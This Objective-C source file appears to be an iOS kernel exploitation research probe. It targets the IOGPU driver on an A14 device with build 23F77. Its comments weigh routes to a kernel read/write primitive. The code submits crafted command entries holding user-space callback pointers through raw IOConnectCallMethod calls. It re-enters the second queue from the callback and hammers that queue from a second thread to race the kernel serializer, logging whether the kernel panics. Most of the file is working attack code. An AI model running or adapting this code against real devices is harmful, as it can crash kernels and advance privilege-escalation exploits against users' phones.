//
//  P030TwoQueue.m
//  P007OpenOnly
//
//  Option 3 probe: two MTLCommandQueues (two kernel IOGPUCommandQueue,
//  two queue+0x430 0x2a8 blobs, two serializers).
//
//  Ranking (23F77 RE, not a KRW claim):
//    Opt 2 (corrupt queue+0x430) — KRW-shaped IF you already had a
//      kernel write to the queue object + a PAC'd fake OSSerialize.
//      We have neither. Circular. Not this button.
//    Opt 1 (skip serializer) — other 5b22b4 producer is 5b20ac
//      (kernel object this+0xe8/+0xd8). Not an IOConnect sel.
//      Userspace reachability MISSING.
//    Opt 3 (two queues) — only path the app can run. Each queue
//      init allocates its own 0x2a8 at +0x430 (dossier). 5b22b4 has
//      no internal lock; 5b3b40 locks *(queue+0x538)+0x150+0x20
//      (per-queue vendor obj, not global).
//
//  Concurrent 5b22b4 on TWO serializers is not a TOCTOU on one
//  OSSerialize length/buffer. Survive = per-queue isolation holds.
//  Panic in 5b22b4/append = missed global shared state. Not KRW.
//
//  ABI: +0x10=+0x18=ctx (never 0). Same FAR=0x10 fix as p028.
//

#import "P030TwoQueue.h"
#import "A14_23F77_LabOffsets.h"
#import "LabLocalTime.h"

#import <Metal/Metal.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

#define P030_BUILD_ID    @"p030-two-queue"
#define P030_ENTRY_SIZE  0x40
#define P030_CTX_SIZE    0x1000
#define P030_NEST_MAX    8
#define P030_HAMMER_MAX  200

typedef uint32_t (*P030GetConn_t)(void *);
typedef uint32_t (*P030GetQid_t)(void *);
typedef kern_return_t (*P030Iocall_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

static FILE *p030_fp;
static NSMutableString *p030_body;

static P030Iocall_t p030_iocall;
static uint32_t p030_sel;
static mach_port_t p030_qconn[2];
static uint64_t p030_in[2][4];
static uint8_t p030_entry[2][P030_ENTRY_SIZE];
static size_t p030_entry_len[2];
static vm_address_t p030_ctx_addr[2];

static volatile int p030_fired[2];
static volatile uint64_t p030_x0[2];
static volatile int p030_stop;
static atomic_int p030_fire_count[2];
static atomic_int p030_nest;
static atomic_int p030_nest_ok;
static atomic_int p030_nest_fail;
static atomic_int p030_hammer_ok;
static atomic_int p030_hammer_fail;
static atomic_uint p030_last_kr;
static atomic_int p030_ready;

static void p030_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1, 2);
static void p030_log(NSString *fmt, ...)
{
    if (!p030_fp) {
        NSString *docs = NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        NSString *path = [docs stringByAppendingPathComponent:@"p030_two_queue_log.txt"];
        p030_fp = fopen(path.UTF8String, "w");
        if (p030_fp) {
            setvbuf(p030_fp, NULL, _IOLBF, 0);
            fprintf(p030_fp, "=== p030 session %s build=%s ===\n",
                    LabLocalMilitaryNow().UTF8String, P030_BUILD_ID.UTF8String);
        }
    }
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (p030_fp) {
        fprintf(p030_fp, "%s\n", msg.UTF8String);
        fflush(p030_fp);
    }
    if (p030_body)
        [p030_body appendFormat:@"%@\n", msg];
}

static id p030_unwrap(id buf)
{
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"])
            break;
        SEL s = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:s])
            break;
        id b = ((id (*)(id, SEL))objc_msgSend)(buf, s);
        if (!b || b == buf)
            break;
        buf = b;
    }
    return buf;
}

static void *p030_ivar(id obj, const char *name)
{
    if (!obj || !name)
        return NULL;
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivs = class_copyIvarList(cls, &n);
        void *val = NULL;
        for (unsigned i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strcmp(nm, name) == 0) {
                val = *(void **)((char *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                break;
            }
        }
        free(ivs);
        if (val)
            return val;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}

static void *p030_strip(void *p)
{
    return (void *)((uintptr_t)p & 0x0000007FFFFFFFFFULL);
}

static int p030_is_heap(void *p)
{
    uintptr_t x = (uintptr_t)p030_strip(p);
    if (x < 0x100000000ULL)
        return 0;
    if ((x & 7) != 0)
        return 0;
    if ((x >> 28) == 0x16)
        return 0;
    return 1;
}

static kern_return_t p030_submit_side(int side)
{
    uint64_t out = 0;
    uint32_t nout = 1;
    if (side < 0 || side > 1 || !p030_iocall || !p030_qconn[side])
        return 0xe00002c2;
    uint8_t local[P030_ENTRY_SIZE];
    memcpy(local, p030_entry[side], P030_ENTRY_SIZE);
    return p030_iocall(p030_qconn[side], p030_sel,
                       p030_in[side], 4, local, p030_entry_len[side],
                       &out, &nout, NULL, 0);
}

/*
 * ctx+0x00 = side (0=A, 1=B), ctx+0x10 = FP.
 * Nested submit goes to the OTHER queue — different +0x430.
 * No usleep. No log. Cap depth.
 */
static void p030_callback(void *ctx)
{
    if (!ctx)
        return;
    int side = (int)(*(uint64_t *)ctx & 1);
    p030_x0[side] = (uint64_t)ctx;
    p030_fired[side] = 1;
    atomic_fetch_add(&p030_fire_count[side], 1);
    if (p030_stop)
        return;
    int n = atomic_fetch_add(&p030_nest, 1);
    if (n >= P030_NEST_MAX)
        return;
    kern_return_t kr = p030_submit_side(side ^ 1);
    atomic_store(&p030_last_kr, (unsigned)kr);
    if (kr == 0)
        atomic_fetch_add(&p030_nest_ok, 1);
    else
        atomic_fetch_add(&p030_nest_fail, 1);
}

/* Tight sel=25 on B while main-thread submit0 hits A. Two 5b22b4. */
static void *p030_hammer_b(void *arg)
{
    (void)arg;
    while (!p030_stop && !atomic_load(&p030_ready))
        ;
    for (int i = 0; i < P030_HAMMER_MAX && !p030_stop; i++) {
        kern_return_t kr = p030_submit_side(1);
        if (kr == 0)
            atomic_fetch_add(&p030_hammer_ok, 1);
        else
            atomic_fetch_add(&p030_hammer_fail, 1);
    }
    return NULL;
}

@implementation P030TwoQueue

+ (NSString *)tap
{
    if (p030_fp) {
        fclose(p030_fp);
        p030_fp = NULL;
    }
    p030_body = [NSMutableString string];
    p030_stop = 0;
    p030_iocall = NULL;
    p030_sel = 0;
    for (int i = 0; i < 2; i++) {
        p030_fired[i] = 0;
        p030_x0[i] = 0;
        p030_qconn[i] = 0;
        p030_ctx_addr[i] = 0;
        p030_entry_len[i] = 0;
        memset(p030_entry[i], 0, P030_ENTRY_SIZE);
        memset(p030_in[i], 0, sizeof(p030_in[i]));
        atomic_store(&p030_fire_count[i], 0);
    }
    atomic_store(&p030_nest, 0);
    atomic_store(&p030_nest_ok, 0);
    atomic_store(&p030_nest_fail, 0);
    atomic_store(&p030_hammer_ok, 0);
    atomic_store(&p030_hammer_fail, 0);
    atomic_store(&p030_last_kr, 0);
    atomic_store(&p030_ready, 0);

    p030_log(@"========================================");
    p030_log(@"BUILD %@ (compiled %s %s)", P030_BUILD_ID, __DATE__, __TIME__);
    p030_log(@"Option 3: two queues. A-callback → sel=25 on B. Hammer B vs submit A.");
    p030_log(@"  5b22b4 has no lock. 5b3b40 is per-queue (vendor+0x20).");
    p030_log(@"  +0x430 blob is QUEUE-PRIVATE 0x2a8. Two serializers.");
    p030_log(@"  This is concurrent 5b22b4, NOT a TOCTOU on one OSSerialize.");
    p030_log(@"  panic @ 5b22b4 = missed global state. survive = isolation.");
    p030_log(@"  FAR=0x10 = empty packet (fail). Not KRW. Not Opt 1/2.");
    p030_log(@"ABI: +0x10=ctx +0x18=ctx +0x20=0 (never +0x18=0)");
    p030_log(@"========================================");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu)
        iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iogpu || !iokit) {
        p030_log(@"[sym] STOP dlopen");
        return [self finish:@"dlopen fail"];
    }

    P030GetConn_t devConnFn = (P030GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    P030GetConn_t qConnFn = (P030GetConn_t)dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    P030GetQid_t qGetID = (P030GetQid_t)dlsym(iogpu, "IOGPUCommandQueueGetID");
    p030_iocall = (P030Iocall_t)dlsym(iokit, "IOConnectCallMethod");
    if (!p030_iocall || !devConnFn || !qConnFn) {
        p030_log(@"[sym] STOP missing symbols");
        return [self finish:@"missing symbols"];
    }

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) {
        p030_log(@"[mtl] STOP no device");
        return [self finish:@"no metal"];
    }
    id<MTLCommandQueue> cmdA = [dev newCommandQueue];
    id<MTLCommandQueue> cmdB = [dev newCommandQueue];
    if (!cmdA || !cmdB) {
        p030_log(@"[mtl] STOP need two queues");
        return [self finish:@"no queue"];
    }

    id mtlQ[2] = { p030_unwrap(cmdA), p030_unwrap(cmdB) };
    uint32_t qid[2] = { 0, 0 };
    uint32_t dconn = 0;
    {
        id mtlDev = p030_unwrap(dev);
        void *devRef = p030_strip(p030_ivar(mtlDev, "_deviceRef"));
        dconn = (devConnFn && p030_is_heap(devRef)) ? devConnFn(devRef) : 0;
    }

    uint32_t stride[2] = { P030_ENTRY_SIZE, P030_ENTRY_SIZE };
    for (int i = 0; i < 2; i++) {
        void *qRef = p030_strip(p030_ivar(mtlQ[i], "_commandQueue"));
        uint32_t qc = (qConnFn && p030_is_heap(qRef)) ? qConnFn(qRef) : 0;
        if (!qc)
            qc = dconn;
        p030_qconn[i] = qc;
        qid[i] = (qGetID && p030_is_heap(qRef)) ? qGetID(qRef) : 0;
        if (p030_is_heap(qRef)) {
            void *stride_obj = *(void **)((uint8_t *)qRef + 0x538);
            if (p030_is_heap(stride_obj)) {
                uint32_t qstride = *(uint32_t *)((uint8_t *)stride_obj + 0x268);
                if (qstride > 0 && qstride <= P030_ENTRY_SIZE)
                    stride[i] = qstride;
                p030_log(@"[%c] qConn=0x%x qid=%u stride raw=0x%x using=0x%x qRef=%p",
                         'A' + i, qc, qid[i], qstride, stride[i], qRef);
            } else {
                p030_log(@"[%c] qConn=0x%x qid=%u stride=0x40 (no heap +0x538)",
                         'A' + i, qc, qid[i]);
            }
        } else {
            p030_log(@"[%c] qConn=0x%x qid=%u qRef not heap", 'A' + i, qc, qid[i]);
        }
    }

    if (!p030_qconn[0] || !p030_qconn[1]) {
        p030_log(@"[0] STOP missing connect");
        return [self finish:@"no connect"];
    }
    if (p030_qconn[0] == p030_qconn[1] && qid[0] == qid[1]) {
        p030_log(@"[0] STOP Metal aliased A and B (same qConn AND qid) — Option 3 invalid");
        return [self finish:@"queues aliased"];
    }
    if (p030_qconn[0] == p030_qconn[1])
        p030_log(@"[0] NOTE same qConn 0x%x but qid A=%u B=%u — still two kernel queues?",
                 p030_qconn[0], qid[0], qid[1]);
    else
        p030_log(@"[0] distinct qConn A=0x%x B=0x%x  qid A=%u B=%u",
                 p030_qconn[0], p030_qconn[1], qid[0], qid[1]);

    p030_sel = (uint32_t)A14_23F77_IOGPU_SUBMIT_SEL;

    for (int i = 0; i < 2; i++) {
        vm_address_t ctxAddr = 0;
        kern_return_t k = vm_allocate(mach_task_self(), &ctxAddr, P030_CTX_SIZE, VM_FLAGS_ANYWHERE);
        if (k != KERN_SUCCESS || !ctxAddr) {
            p030_log(@"[ctx] STOP vm_allocate %c kr=0x%x", 'A' + i, (unsigned)k);
            if (p030_ctx_addr[0])
                vm_deallocate(mach_task_self(), p030_ctx_addr[0], P030_CTX_SIZE);
            return [self finish:@"vm_allocate fail"];
        }
        p030_ctx_addr[i] = ctxAddr;
        uint8_t *ctx = (uint8_t *)(uintptr_t)ctxAddr;
        memset(ctx, 0, P030_CTX_SIZE);
        *(uint64_t *)(ctx + 0x00) = (uint64_t)i; /* side */
        *(uint64_t *)(ctx + 0x10) = (uint64_t)(void *)&p030_callback;
        memset(p030_entry[i], 0, P030_ENTRY_SIZE);
        *(uint64_t *)(p030_entry[i] + 0x10) = (uint64_t)(uintptr_t)ctx;
        *(uint64_t *)(p030_entry[i] + 0x18) = (uint64_t)(uintptr_t)ctx;
        p030_entry_len[i] = stride[i];
        p030_in[i][0] = qid[i];
        p030_in[i][1] = 0;
        p030_in[i][2] = 1;
        p030_in[i][3] = stride[i];
        p030_log(@"[ctx%c] 0x%llx side=%d FP @ +0x10 entry +0x10=+0x18=ctx stride=0x%x",
                 'A' + i, (unsigned long long)ctxAddr, i, stride[i]);
    }
    if (p030_fp)
        fflush(p030_fp);

    pthread_t th = NULL;
    pthread_create(&th, NULL, p030_hammer_b, NULL);
    atomic_store(&p030_ready, 1);

    uint64_t out = 0;
    uint32_t nout = 1;
    uint8_t localA[P030_ENTRY_SIZE];
    memcpy(localA, p030_entry[0], P030_ENTRY_SIZE);
    kern_return_t kr = p030_iocall(p030_qconn[0], p030_sel,
                                   p030_in[0], 4, localA, p030_entry_len[0],
                                   &out, &nout, NULL, 0);
    p030_log(@"[submit0 A] kr=0x%x out=0x%llx (hammer B already running)",
             (unsigned)kr, (unsigned long long)out);

    p030_log(@"[wait] 5s A↔B nest + hammer B (ctx mapped until join+drain)");
    if (p030_fp)
        fflush(p030_fp);
    for (int t = 0; t < 5000 && !p030_stop; t++) {
        usleep(1000);
        if (t == 0 || (t % 1000) == 0) {
            p030_log(@"[t=%ds] fireA=%d/%d fireB=%d/%d nest=%d ok=%d fail=%d hammerB ok=%d fail=%d last_kr=0x%x",
                     t / 1000,
                     p030_fired[0], atomic_load(&p030_fire_count[0]),
                     p030_fired[1], atomic_load(&p030_fire_count[1]),
                     atomic_load(&p030_nest),
                     atomic_load(&p030_nest_ok),
                     atomic_load(&p030_nest_fail),
                     atomic_load(&p030_hammer_ok),
                     atomic_load(&p030_hammer_fail),
                     atomic_load(&p030_last_kr));
            if (p030_fp)
                fflush(p030_fp);
        }
    }
    p030_stop = 1;
    if (th)
        pthread_join(th, NULL);
    usleep(200000);

    p030_log(@"[result] A fired=%d count=%d x0=0x%llx ctx=0x%llx",
             p030_fired[0], atomic_load(&p030_fire_count[0]),
             (unsigned long long)p030_x0[0], (unsigned long long)p030_ctx_addr[0]);
    p030_log(@"[result] B fired=%d count=%d x0=0x%llx ctx=0x%llx",
             p030_fired[1], atomic_load(&p030_fire_count[1]),
             (unsigned long long)p030_x0[1], (unsigned long long)p030_ctx_addr[1]);
    p030_log(@"[result] nest=%d ok=%d fail=%d hammerB ok=%d fail=%d last_kr=0x%x",
             atomic_load(&p030_nest),
             atomic_load(&p030_nest_ok),
             atomic_load(&p030_nest_fail),
             atomic_load(&p030_hammer_ok),
             atomic_load(&p030_hammer_fail),
             atomic_load(&p030_last_kr));

    if (p030_fired[0] && p030_fired[1] && atomic_load(&p030_nest_ok) > 0) {
        p030_log(@"=== verdict: CROSS-QUEUE RE-ENTRY ACCEPTED (A and B both fired, nest kr=0) ===");
        p030_log(@"  two DA threads / two serializers. isolation held unless kernel panicked.");
        p030_log(@"  this is NOT a same-serializer TOCTOU. Not KRW.");
    } else if (p030_fired[0] && p030_fired[1]) {
        p030_log(@"=== verdict: BOTH CALLBACKS FIRED, nest rejected or capped ===");
        p030_log(@"  last_kr=0x%x", atomic_load(&p030_last_kr));
    } else if (p030_fired[0] && !p030_fired[1]) {
        p030_log(@"=== verdict: A FIRED, B DID NOT — cross-queue submit did not complete NQ ===");
    } else if (!p030_fired[0] && p030_fired[1]) {
        p030_log(@"=== verdict: B FIRED (hammer), A DID NOT ===");
    } else if (kr == 0) {
        p030_log(@"=== verdict: SUBMIT0 A OK, no callbacks ===");
        p030_log(@"  FAR=0x10 = empty NQ ctx (fail)");
    } else {
        p030_log(@"=== verdict: SUBMIT0 A FAILED kr=0x%x ===", (unsigned)kr);
    }
    p030_log(@"NOT KRW. Option 3 probe only.");

    for (int i = 0; i < 2; i++) {
        if (p030_ctx_addr[i])
            vm_deallocate(mach_task_self(), p030_ctx_addr[i], P030_CTX_SIZE);
        p030_ctx_addr[i] = 0;
    }
    return [self finish:@"ok"];
}

+ (NSString *)finish:(NSString *)tag
{
    if (p030_fp) {
        fflush(p030_fp);
        fclose(p030_fp);
        p030_fp = NULL;
    }
    NSString *body = p030_body ?: @"(empty)";
    p030_body = nil;
    return [NSString stringWithFormat:@"=== LIVE TAP %@ (%@) ===\n%@\n",
            P030_BUILD_ID, tag, body];
}

@end
